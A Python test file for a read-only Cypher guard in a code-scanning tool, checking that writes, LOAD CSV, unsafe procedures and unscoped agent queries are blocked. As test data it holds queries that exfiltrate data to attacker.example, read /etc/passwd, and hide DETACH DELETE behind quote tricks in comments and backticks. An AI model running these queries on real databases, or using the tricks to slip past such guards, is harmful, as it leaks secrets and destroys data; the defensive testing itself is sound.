"""The read-only write-guard: structural writes are blocked, but a write KEYWORD inside a string
literal (a legitimate read query searching source text for DML) is not falsely rejected.

Pure — exercises `graphdb._has_write_keyword` directly, no Neo4j needed.
"""
from __future__ import annotations

from orion.graphdb import _has_write_keyword


def test_structural_writes_are_blocked():
    for q in (
        "CREATE (n) RETURN n",
        "MATCH (n {scan_id:$scan_id}) SET n.x = 1 RETURN n",
        "MATCH (n) DETACH DELETE n",
        "MERGE (n:X {a:1})",
        "MATCH (n) REMOVE n.p",
    ):
        assert _has_write_keyword(q), q


def test_write_keyword_inside_string_literal_is_allowed():
    # A security scanner legitimately hunts SQLi/command-injection sinks by searching CpgCall.code
    # for DML words — these are READS and must not be blocked.
    for q in (
        "MATCH (c:CpgCall {scan_id:$scan_id}) WHERE c.code CONTAINS 'SET role=admin' RETURN c",
        'MATCH (c) WHERE c.code CONTAINS "DELETE FROM users" RETURN c',
        "MATCH (c) WHERE c.code CONTAINS 'CREATE TABLE t' RETURN c.code",
        "MATCH (c) WHERE c.code =~ '.*DROP .*' RETURN c",
    ):
        assert not _has_write_keyword(q), q


def test_plain_read_is_allowed():
    assert not _has_write_keyword(
        "MATCH (f:CpgFile {scan_id:$scan_id}) RETURN f.file_path ORDER BY f.file_path"
    )


# ── reads that escape the graph, procedures, and scan scoping ──────────
from orion.cypher_guard import scope_problem  # noqa: E402
from orion.graphdb import blocked_reason  # noqa: E402


def test_escaping_reads_and_batch_writes_are_blocked():
    for q in (
        "LOAD CSV FROM 'https://attacker.example/x?d=' + 'secret' AS row RETURN row",
        "load   csv with headers from 'file:///etc/passwd' as r return r",
        "MATCH (n {scan_id:$scan_id}) FOREACH (x IN [1] | SET n.p = x)",
        "CALL { MATCH (n {scan_id:$scan_id}) RETURN n } IN TRANSACTIONS RETURN 1",
        "USING PERIODIC COMMIT LOAD CSV FROM 'x' AS r RETURN r",
    ):
        assert blocked_reason(q), q


def test_only_read_only_procedures_are_allowed():
    for q in ("CALL dbms.setConfigValue('x', 'y')", "CALL apoc.load.json('https://x')",
              "CALL db.createLabel('X')", "CALL db.index.fulltext.createNodeIndex('i', ['A'], ['p'])"):
        assert blocked_reason(q), q
    for q in ("CALL db.schema.nodeTypeProperties()", "CALL db.labels() YIELD label RETURN label",
              "CALL db.index.vector.queryNodes('chunk_embedding', 5, $v) YIELD node RETURN node",
              "MATCH (c:CpgCall {scan_id:$scan_id}) CALL { WITH c RETURN c.name AS n } RETURN n"):
        assert blocked_reason(q) is None, q


def test_keywords_inside_literals_and_backticks_stay_allowed():
    assert blocked_reason("MATCH (c {scan_id:$scan_id}) WHERE c.code CONTAINS 'LOAD CSV FROM' RETURN c") is None
    assert blocked_reason("MATCH (c {scan_id:$scan_id}) RETURN c.`CALL dbms.x` AS v") is None


def test_agent_queries_must_be_scan_scoped():
    sid = "a" * 40
    assert scope_problem("MATCH (c:CpgCall) RETURN count(c)", sid)
    assert scope_problem("MATCH (c:CpgCall) WHERE c.code CONTAINS '$scan_id' RETURN c", sid)  # literal
    assert scope_problem("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN count(c)", sid) is None
    assert scope_problem(f"MATCH (c:CpgCall {{scan_id:'{sid}'}}) RETURN count(c)", sid) is None
    assert scope_problem("CALL db.schema.nodeTypeProperties()", sid) is None     # no MATCH


def test_mcp_tool_refuses_unscoped_query_before_touching_neo4j():
    from orion.mcp_server import run_cypher_impl
    result = run_cypher_impl("MATCH (n) RETURN n", "any-scan")
    assert "unscoped query" in result["error"]


def test_quote_inside_backtick_or_comment_cannot_hide_a_write():
    # Strings, comments and backtick identifiers are blanked in ONE left-to-right pass, so a quote
    # inside a backtick identifier or a comment can no longer open a fake "string" that hides DELETE.
    for q in (
        "MATCH (n WHERE true) WITH n AS `'` DETACH DELETE `'`",
        'MATCH (n) WITH n AS `"` DETACH DELETE n',
        "MATCH (n) // it's a comment\nDETACH DELETE n RETURN 'x'",
        "MATCH (n) /* don't */ DETACH DELETE n RETURN 'x'",
        "MATCH (n) WITH n AS `x DETACH DELETE n",          # unterminated backtick stays visible
    ):
        assert _has_write_keyword(q), q


def test_write_word_as_identifier_or_comment_is_not_a_write():
    assert not _has_write_keyword("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c.code AS `DELETE`")
    assert not _has_write_keyword("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c // never DELETE")


# --- GraphDB.run_cypher wiring, against a fake driver (no Neo4j) ---
from types import SimpleNamespace

from orion import config, graphdb


class _Rec(dict):
    """A record stand-in: dict(rec) (the bounded lm path) and rec.data() (the agents' path)."""

    def data(self):
        return dict(self)


class _FakeResult:
    def __init__(self, rows, qtype):
        self._rows, self.qtype, self.fetched, self.consumed = [_Rec(r) for r in rows], qtype, 0, False

    def __iter__(self):
        while self._rows:
            self.fetched += 1
            yield self._rows.pop(0)

    def fetch(self, n):
        out, self._rows = self._rows[:n], self._rows[n:]
        self.fetched += len(out)
        return out

    def peek(self):
        return self._rows[0] if self._rows else None

    def consume(self):
        self.consumed = True
        return SimpleNamespace(query_type=self.qtype)


class _FakeDriver:
    """Records every execute_read: the work function's @unit_of_work timeout, the query, the params."""

    def __init__(self, rows, qtype="r"):
        self.rows, self.qtype, self.reads, self.queries, self.results = rows, qtype, [], [], []

    def session(self, **kw):
        drv = self

        class _Tx:
            def run(self, query, **params):
                drv.queries.append((query, params))
                res = _FakeResult(drv.rows, drv.qtype)
                drv.results.append(res)
                return res

        class _S:
            def __enter__(self): return self
            def __exit__(self, *a): return False
            def execute_read(self, work):
                drv.reads.append(getattr(work, "timeout", None))
                return work(_Tx())
            def run(self, *a, **k):
                raise AssertionError("run_cypher must use a managed READ transaction, not session.run")
        return _S()

    def close(self):
        pass


def _db_with(monkeypatch, rows, qtype="r"):
    fake = _FakeDriver(rows, qtype)
    monkeypatch.setattr(graphdb.GraphDatabase, "driver", lambda *a, **k: fake)
    return graphdb.GraphDB(), fake


def test_run_cypher_runs_in_a_managed_read_transaction(monkeypatch):
    db, fake = _db_with(monkeypatch, [{"c": 1}])
    assert db.run_cypher("s", "MATCH (c:CpgCall {scan_id:$scan_id}) RETURN 1 AS c") ==         {"row_count": 1, "rows": [{"c": 1}]}
    assert len(fake.reads) == 1


def test_default_run_cypher_streams_counts_all_and_has_the_default_timeout(monkeypatch):
    # The agents' path: every row counted, only `limit` kept, config.CYPHER_TIMEOUT applied.
    db, fake = _db_with(monkeypatch, [{"i": i} for i in range(80)])
    out = db.run_cypher("s", "MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c.line AS i")
    assert out == {"row_count": 80, "rows": [{"i": i} for i in range(50)]}
    assert fake.queries[0] == ("MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c.line AS i", {"scan_id": "s"})
    assert fake.reads == [config.CYPHER_TIMEOUT]


def test_bounded_run_cypher_fetches_at_most_limit_with_timeout_and_query_type(monkeypatch):
    db, fake = _db_with(monkeypatch, [{"i": i} for i in range(1000)])
    out = db.run_cypher("s", "MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c.line AS i", limit=5,
                        timeout=10, bounded=True)
    assert out == {"row_count": 5, "rows": [{"i": i} for i in range(5)], "truncated": True,
                   "query_type": "r"}
    assert fake.results[0].fetched == 5 and fake.results[0].consumed
    assert fake.reads == [10]


def test_bounded_run_cypher_not_truncated_when_all_rows_fit(monkeypatch):
    db, _ = _db_with(monkeypatch, [{"i": 1}, {"i": 2}], qtype="r")
    out = db.run_cypher("s", "MATCH (c:CpgCall {scan_id:$scan_id}) RETURN c.line AS i", limit=5,
                        bounded=True)
    assert out["truncated"] is False and out["row_count"] == 2


def test_a_quote_in_a_comment_cannot_hide_load_csv():
    # Found comparing the branches (2026-10-27): the old literal-only blanking let this through.
    q = ("MATCH (c:CpgCall {scan_id:$scan_id}) // don't\n"
         "WITH c LOAD CSV FROM 'http://attacker.example/x?d=' + c.code AS row RETURN row // '")
    assert blocked_reason(q) == "read-only: LOAD CSV is blocked"
